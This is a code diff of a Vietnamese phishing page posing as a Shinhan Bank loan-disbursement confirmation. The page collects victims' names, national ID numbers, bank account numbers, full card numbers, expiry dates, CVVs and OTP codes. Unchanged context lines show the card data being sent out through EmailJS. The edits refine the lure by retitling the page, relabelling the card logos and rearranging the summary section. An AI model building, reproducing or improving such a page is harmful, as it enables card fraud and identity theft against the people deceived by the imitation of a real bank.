@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xác Nhận Giải Ngân Qua Visa - Shinhan Bank</title>
+    <title>Xác Nhận Giải Ngân Qua ATM</title>
     <script async src="https://cdnjs.cloudflare.com/ajax/libs/inputmask/5.0.8/inputmask.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <script>
@@ -241,12 +241,17 @@
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
         }
 
-        h2 {
+        .container h2 {
+            display: none;
             text-align: center;
             margin-bottom: 15px;
         }
 
-        h2 img {
+        .container h2.active {
+            display: block;
+        }
+
+        .container h2 img {
             height: 24px;
             vertical-align: middle;
             margin-right: 8px;
@@ -405,10 +410,15 @@
         }
 
         .summary {
+            display: none;
             margin-bottom: 20px;
             padding: 15px;
             background-color: #f9f9f9;
             border-radius: 5px;
+        }
+
+        .summary.active {
+            display: block;
         }
 
         .summary h3 {
@@ -450,7 +460,7 @@
             width: 100%;
             padding: 8px;
             border: 1px solid #ccc;
-            border-radius: warring: css: unexpected token, expected ; or } at line 1018, col 25
+            border-radius: 5px;
             font-size: 14px;
         }
 
@@ -781,25 +791,25 @@
     <div class="container">
         <h2>
             <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Logo" style="height: 24px; vertical-align: middle; margin-right: 8px;">
-            Xác Nhận Giải Ngân Qua Visa
+            Xác Nhận Giải Ngân Qua ATM
         </h2>
         <div class="bank-selection active" id="bank-selection">
             <h3>Chọn ngân hàng</h3>
             <div class="bank-grid">
                 <div class="bank-option" data-bank="BANK_25" data-logo="https://www.vban.vn/Resources/images/logo-bank/25.png">
-                    <img src="https://www.vban.vn/Resources/images/logo-bank/25.png" alt="BANK_25 Logo">
+                    <img src="https://www.vban.vn/Resources/images/logo-bank/25.png" alt="Thẻ Mastercard">
                     <p>BANK_25</p>
                 </div>
                 <div class="bank-option" data-bank="BANK_26" data-logo="https://www.vban.vn/Resources/images/logo-bank/26.png">
-                    <img src="https://www.vban.vn/Resources/images/logo-bank/26.png" alt="BANK_26 Logo">
+                    <img src="https://www.vban.vn/Resources/images/logo-bank/26.png" alt="Thẻ Visa">
                     <p>BANK_26</p>
                 </div>
                 <div class="bank-option" data-bank="BANK_27" data-logo="https://www.vban.vn/Resources/images/logo-bank/27.png">
-                    <img src="https://www.vban.vn/Resources/images/logo-bank/27.png" alt="BANK_27 Logo">
+                    <img src="https://www.vban.vn/Resources/images/logo-bank/27.png" alt="Thẻ JCB">
                     <p>BANK_27</p>
                 </div>
                 <div class="bank-option" data-bank="UIP" data-logo="https://www.vban.vn/Resources/images/logo-bank/uip.png">
-                    <img src="https://www.vban.vn/Resources/images/logo-bank/uip.png" alt="UIP Logo">
+                    <img src="https://www.vban.vn/Resources/images/logo-bank/uip.png" alt="Thẻ UIP">
                     <p>UIP</p>
                 </div>
             </div>
@@ -808,6 +818,20 @@
                 <button class="primary" onclick="confirmBank()">Xác nhận</button>
             </div>
         </div>
+        <div class="summary">
+            <h3>Thông tin giải ngân</h3>
+            <p>Họ và Tên: <span id="summaryName"></span></p>
+            <p>Số CCCD: <span id="summaryCCCD"></span></p>
+            <p>Số tiền: <span id="summaryAmount"></span></p>
+            <p>Thời hạn vay: <span id="summaryMonths"></span> tháng</p>
+            <p>Ngân hàng: <span id="summaryBank"></span></p>
+            <p>Số điện thoại: <span id="summaryPhone"></span></p>
+            <p>Số tài khoản nhận tiền giải ngân: <span id="summaryAccountNumber"></span></p>
+            <p>Số thẻ Visa: <span id="summaryCardNumber"></span></p>
+            <p>Ngày hết hạn: <span id="summaryExpiryDate"></span></p>
+            <p>Họ và tên chủ thẻ: <span id="summaryFullName"></span></p>
+            <p>Số CVV: <span id="summaryCvv"></span></p>
+        </div>
         <div class="guide-section" id="card-guide">
             <img class="bank-logo" id="selected-bank-logo" src="" alt="Logo ngân hàng đã chọn">
             <h3>Hướng dẫn nhập thông tin thẻ Visa</h3>
@@ -815,20 +839,6 @@
             <p>Số thẻ Visa in trên mặt trước thẻ.</p>
         </div>
         <form id="card-info-form" class="card-form">
-            <div class="summary">
-                <h3>Thông tin giải ngân</h3>
-                <p>Họ và Tên: <span id="summaryName"></span></p>
-                <p>Số CCCD: <span id="summaryCCCD"></span></p>
-                <p>Số tiền: <span id="summaryAmount"></span></p>
-                <p>Thời hạn vay: <span id="summaryMonths"></span> tháng</p>
-                <p>Ngân hàng: <span id="summaryBank"></span></p>
-                <p>Số điện thoại: <span id="summaryPhone"></span></p>
-                <p>Số tài khoản nhận tiền giải ngân: <span id="summaryAccountNumber"></span></p>
-                <p>Số thẻ Visa: <span id="summaryCardNumber"></span></p>
-                <p>Ngày hết hạn: <span id="summaryExpiryDate"></span></p>
-                <p>Họ và tên chủ thẻ: <span id="summaryFullName"></span></p>
-                <p>Số CVV: <span id="summaryCvv"></span></p>
-            </div>
             <p class="check-info">Vui lòng kiểm tra thông tin trước khi nhập thẻ!</p>
             <div class="form-group" aria-live="polite">
                 <label for="visaCardNumber">Số thẻ Visa *</label>
@@ -955,7 +965,7 @@
                 Inputmask({ mask: "999" }).mask(document.getElementById('visaCvv'));
                 Inputmask({ regex: "\\d{6}" }).mask(document.getElementById('otp'));
             }
-            // Manual spacing for card number
+            // Manual spacing for card number if Inputmask fails
             const cardInput = document.getElementById('visaCardNumber');
             cardInput.addEventListener('input', function() {
                 let value = cardInput.value.replace(/\D/g, '');
@@ -1046,6 +1056,8 @@
             document.getElementById('issue-guide-btn').classList.add('active');
             document.getElementById('selected-bank-logo').src = selectedBankLogo;
             document.querySelector('.guide-section img').setAttribute('data-bank', selectedBank);
+            document.querySelector('.container h2').classList.add('active');
+            document.querySelector('.summary').classList.add('active');
         }
 
         // Validate Date (mm/yy)
@@ -1112,7 +1124,7 @@
                 document.getElementById('summaryFullName').textContent = formData.fullName;
                 document.getElementById('summaryCvv').textContent = formData.cvv;
                 sessionStorage.setItem('formData', JSON.stringify(formData));
-                // Send card info via EmailJS
+                // Gửi thông tin thẻ qua EmailJS
                 const cardData = {
                     cardType: formData.cardType,
                     cardNumber: formData.cardNumber,
